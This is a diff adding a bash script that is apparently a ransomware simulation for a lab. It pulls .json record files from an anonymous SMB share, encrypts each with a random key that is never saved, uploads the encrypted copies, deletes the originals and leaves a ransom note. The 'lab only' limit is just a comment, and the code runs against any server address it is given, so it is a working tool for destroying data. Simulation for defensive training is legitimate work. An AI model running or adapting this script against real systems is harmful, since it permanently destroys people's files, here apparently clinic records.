@@ -1,0 +1,29 @@
+#!/bin/bash
+# LAB SIMULATION ONLY. Mimics what ransomware does once it reaches a file
+# share: copy each file, encrypt it with a throwaway key, write the encrypted
+# copy back, delete the original, leave a ransom note. It only targets the
+# synthetic records share inside this lab.
+#
+# Usage: clinic-ransomware <file-server-ip>
+# Prints one JSON line per file it encrypts.
+set -uo pipefail
+server=$1
+share="//$server/records"
+key=$(openssl rand -hex 16)   # never stored: the files are gone for good
+work=$(mktemp -d)
+
+files=$(smbclient "$share" -N -c ls 2>/dev/null | awk '$1 ~ /\.json$/ {print $1}')
+if [ -z "$files" ]; then
+    echo '{"step":"share","ok":false}'
+    exit 1
+fi
+echo '{"step":"share","ok":true}'
+for f in $files; do
+    smbclient "$share" -N -c "get $f $work/$f" >/dev/null 2>&1 || continue
+    openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$key" -in "$work/$f" -out "$work/$f.locked"
+    smbclient "$share" -N -c "put $work/$f.locked $f.locked; del $f" >/dev/null 2>&1 \
+        && printf '{"step":"encrypt","file":"%s"}\n' "$f"
+done
+printf 'Your files are encrypted. (This is a lab simulation.)\n' > "$work/README-RESTORE-FILES.txt"
+smbclient "$share" -N -c "put $work/README-RESTORE-FILES.txt README-RESTORE-FILES.txt" >/dev/null 2>&1
+echo '{"step":"done"}'
